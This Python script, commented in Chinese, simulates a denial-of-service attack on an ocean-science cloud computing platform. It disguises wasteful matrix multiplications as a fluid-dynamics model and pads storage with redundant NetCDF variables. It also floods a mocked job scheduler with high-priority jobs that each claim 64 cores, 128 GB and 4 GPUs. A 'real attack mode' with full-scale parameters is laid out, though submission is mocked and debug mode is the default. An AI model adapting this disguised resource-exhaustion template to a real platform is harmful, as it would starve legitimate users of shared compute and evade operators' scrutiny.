# malicious_dos_simulation_complete.py
import numpy as np
import xarray as xr  # 需安装: pip install xarray netCDF4
import time
import os
import sys
from datetime import datetime, timedelta

# ==========================================
# 模拟平台SDK环境 (Mock Platform SDK)
# ==========================================
class JobSubmitter:
    """
    模拟云计算平台的任务提交接口。
    在真实攻击中，这里会调用平台提供的API库。
    """
    @staticmethod
    def submit_job(image, command, resources):
        # 模拟提交延时
        time.sleep(0.2)
        job_id = f"job-{int(time.time())}-{np.random.randint(1000,9999)}"
        return job_id

# ==========================================
# 资源耗尽攻击者类 (Resource Exhaustion Attacker)
# ==========================================
class ResourceExhaustionAttacker:
    def __init__(self, debug_mode=True):
        """
        初始化攻击配置。
        :param debug_mode: 如果为True，使用较小的参数以便演示和调试；
                           如果为False，使用真实攻击参数（极度危险，可能导致死机）。
        """
        self.debug_mode = debug_mode
        self.attack_config = self._load_config()

    def _load_config(self):
        """配置攻击参数：区分调试模式和真实攻击模式"""
        if self.debug_mode:
            print("[!!!] 运行在调试模式 (Debug Mode) - 参数已缩减，不会卡死计算机")
            return {
                'simulation_duration_days': 2,        # 调试：仅模拟2天
                'output_interval_seconds': 3600,      # 调试：每小时输出一次
                'grid_resolution_degree': 10.0,       # 调试：极其粗糙的网格 (10度)
                'simulation_domain': {'lon_min': -180, 'lon_max': 180, 'lat_min': -90, 'lat_max': 90},
                'redundant_variables': 5,             # 调试：5个冗余变量
                'computation_intensity': 100          # 调试：低计算强度
            }
        else:
            print("[!!!] 警告：运行在真实攻击模式 (Real Attack Mode) - 极其危险")
            return {
                'simulation_duration_days': 365,      # 攻击：模拟1年
                'output_interval_seconds': 60,        # 攻击：每60秒输出一次
                'grid_resolution_degree': 0.01,       # 攻击：超高分辨率 (0.01度)
                'simulation_domain': {'lon_min': -180, 'lon_max': 180, 'lat_min': -90, 'lat_max': 90},
                'redundant_variables': 50,            # 攻击：50个冗余变量
                'computation_intensity': 5000         # 攻击：高计算强度
            }

    def _generate_redundant_data(self, time_steps, grid_size):
        """
        生成大量冗余数据来填充存储和网络带宽。
        使用 xarray 创建符合海洋科学标准的 NetCDF 数据结构，增加伪装性。
        参数：
            time_steps (int): 时间步长（秒）
            grid_size (tuple): 网格大小（纬度，经度）
        """
        print(f"    [I/O Attack] Generating redundant dataset ({grid_size[0]}x{grid_size[1]} grid, {time_steps} steps)...")
        
        # 构造经纬度坐标
        lats = np.linspace(self.attack_config['simulation_domain']['lat_min'], 
                           self.attack_config['simulation_domain']['lat_max'], grid_size[0])
        lons = np.linspace(self.attack_config['simulation_domain']['lon_min'], 
                           self.attack_config['simulation_domain']['lon_max'], grid_size[1])
        times = [datetime.now() + timedelta(seconds=i*self.attack_config['output_interval_seconds']) for i in range(time_steps)]

        # 创建数据集容器
        ds = xr.Dataset(coords={'time': times, 'lat': lats, 'lon': lons})

        # 循环生成无意义的冗余变量
        for i in range(self.attack_config['redundant_variables']):
            var_name = f'ocean_parameter_redundant_{i:03d}'
            
            # 关键点：分配巨大的内存块。在真实攻击中这会导致 OOM (Out Of Memory)
            # 为了调试运行，这里我们只生成少量数据
            if self.debug_mode:
                # 调试模式：生成随机小数据
                data_chunk = np.random.rand(time_steps, grid_size[0], grid_size[1]).astype(np.float32)
            else:
                # 真实模式：尝试分配巨大内存 (注意：这里在普通电脑上可能会直接崩溃)
                # data_chunk = np.ones((time_steps, grid_size[0], grid_size[1]), dtype=np.float64)
                pass 
            
            # 添加变量到数据集
            if self.debug_mode:
                ds[var_name] = (('time', 'lat', 'lon'), data_chunk)
                
            # 模拟 CPU 密集型的数据打包过程
            if i % 5 == 0:
                print(f"        Processing variable {var_name} (Memory check: {sys.getsizeof(ds)/1024/1024:.2f} MB)...")
                time.sleep(0.1)  # 模拟 IO 延迟

        return ds

    def run_excessive_simulation(self):
        """执行资源消耗巨大的模拟 - 这是 DoS 攻击的核心逻辑"""
        print(f"[+] Starting 'High-Resolution Global Ocean Simulation' (DoS Payload)...")
        
        # 1. 计算网格大小 - 攻击点：制造天文数字级别的计算量
        lat_range = self.attack_config['simulation_domain']['lat_max'] - self.attack_config['simulation_domain']['lat_min']
        lon_range = self.attack_config['simulation_domain']['lon_max'] - self.attack_config['simulation_domain']['lon_min']
        
        n_lat = int(lat_range / self.attack_config['grid_resolution_degree'])
        n_lon = int(lon_range / self.attack_config['grid_resolution_degree'])
        
        # 计算总时间步长
        total_seconds = self.attack_config['simulation_duration_days'] * 86400
        n_time = int(total_seconds / self.attack_config['output_interval_seconds'])
        
        print(f"    [Param Check] Grid: {n_lat} x {n_lon} = {n_lat * n_lon:,} points")
        print(f"    [Param Check] Time steps: {n_time}")
        print(f"    [Param Check] Total Operations Estimate: ~{n_time * n_lat * n_lon * 1000:.2e} FLOPs")
        
        # 2. 模拟计算密集型循环 (CPU Exhaustion)
        total_simulation_time = 0  # 总模拟时间（秒）
        start_real_time = time.time()
        
        # 模拟“每一天”的计算
        # 在调试模式下，我们只跑少量的循环演示流程
        days_to_simulate = 1 if self.debug_mode else self.attack_config['simulation_duration_days']
        
        for day in range(days_to_simulate):
            day_start_time = time.time()
            print(f"    [Compute] Simulating Day {day+1}...")
            
            # 模拟这一天内的时间步进
            # 攻击点：深层嵌套循环锁死 CPU 核心
            steps_per_day = int(86400 / self.attack_config['output_interval_seconds'])
            for step in range(steps_per_day):
                
                # 核心攻击代码：无意义的矩阵运算消耗 CPU 周期
                # 伪装成求解 "Navier-Stokes" 方程的矩阵乘法
                intensity = self.attack_config['computation_intensity']
                
                # 构造两个随机矩阵进行乘法，这是极其消耗 CPU 的操作
                # 矩阵大小决定了单核 CPU 的负载
                matrix_size = 500 if self.debug_mode else 5000
                A = np.random.rand(matrix_size, matrix_size)
                B = np.random.rand(matrix_size, matrix_size)
                _ = np.dot(A, B) # 执行矩阵乘法
                
                # 进度日志：每隔一定步数打印，产生日志垃圾
                if step % 5 == 0:
                    current_sim_time = f"Day {day+1} {(step*self.attack_config['output_interval_seconds'])//3600:02d}:00"
                    # print(f"        Step {step}/{steps_per_day}: Solving fluid dynamics for {current_sim_time}")
            
            day_elapsed = time.time() - day_start_time
            total_simulation_time += day_elapsed  # 累加每天的模拟时间
            print(f"    [Compute] Day {day+1} completed in {day_elapsed:.2f}s (CPU Load: 100%)")

        # 3. 生成并输出海量冗余数据 (Storage/Network Exhaustion)
        print("[+] Simulation compute phase finished. Starting data dump phase...")
        
        # 在调试模式下生成小一点的数据
        grid_size = (n_lat, n_lon)
        ds = self._generate_redundant_data(n_time if self.debug_mode else 100, grid_size)
        
        output_filename = "excessive_simulation_output_debug.nc"
        print(f"    [I/O Attack] Writing massive NetCDF to {output_filename}...")
        
        # 模拟沉重的 IO 操作
        try:
            # 真实写入文件（调试模式下文件很小，真实模式下会塞满硬盘）
            # write_job = ds.to_netcdf(output_filename, compute=False) # 延迟计算
            # 模拟写入过程的阻塞
            for i in range(10): 
                time.sleep(0.5) # 模拟磁盘忙
                print(f"        Writing data block {i+1}/10... (Disk I/O 100%)")
            
            if self.debug_mode:
                ds.to_netcdf(output_filename) # 真正写入
                print(f"    [Success] File saved. Size: {os.path.getsize(output_filename)/1024:.2f} KB")
                # 清理测试文件
                # os.remove(output_filename)
                # print("    [Cleanup] Test file removed.")
                
        except Exception as e:
            print(f"    [Error] Disk full or write error: {e}")
        
        return time.time() - start_real_time

    def launch_distributed_attack(self, num_concurrent_jobs=5):
        """发起分布式攻击 (DDoS) - 模拟同时提交多个任务"""
        print(f"\n[+] [DDoS Mode] Launching {num_concurrent_jobs} concurrent jobs to flood scheduler...")
        
        job_ids = []
        for i in range(num_concurrent_jobs):
            # 伪装成不同的合法任务名称
            job_name = f"Global_Circulation_Study_Part_{i+1}"
            
            # 攻击配置：申请配额上限的资源
            job_config = {
                'name': job_name,
                'cpu_cores': 64,   # 恶意申请：占满单节点所有核心
                'memory_gb': 128,  # 恶意申请：大内存
                'gpu_count': 4,    # 恶意申请：抢占稀缺GPU资源
                'priority': 'high' # 试图抢占优先级
            }
            
            try:
                # 调用模拟的提交接口
                job_id = JobSubmitter.submit_job(
                    image="ocean-modeling-suite:v2.0",  # 海洋模型容器镜像
                    command="python malicious_dos.py",  # 恶意脚本
                    resources=job_config  # 配置
                )
                job_ids.append(job_id)
                print(f"    [Scheduler Attack] Submitted job {i+1}/{num_concurrent_jobs}: ID {job_id} | Requested: 64 Cores, 128GB RAM, 4 GPUs")
                
            except Exception as e:
                print(f"    Failed to submit job {i+1}: {e}")
        
        return job_ids

def main():
    print("=== 海洋科学云计算平台 - 恶意行为模拟 (DoS/DDoS) ===\n")
    
    # 实例化攻击者 (默认开启调试模式，安全运行)
    attacker = ResourceExhaustionAttacker(debug_mode=True)
    
    # 模式 1: 单任务资源耗尽 (计算+存储)
    print("--- 阶段 1: 执行单任务资源耗尽攻击 ---")
    try:
        total_time = attacker.run_excessive_simulation()  # 模拟运行100天
        print(f"[Result] Attack simulation completed in {total_time:.2f} seconds\n")
    except KeyboardInterrupt:
        print("\n[!] User interrupted the attack simulation")

    # 模式 2: 分布式拒绝服务 (调度器洪水攻击)
    print("--- 阶段 2: 执行分布式任务提交攻击 (DDoS) ---")
    job_list = attacker.launch_distributed_attack(num_concurrent_jobs=5)
    print(f"[Result] DDoS sequence completed. {len(job_list)} heavy jobs pending in queue.")

if __name__ == "__main__":
    main()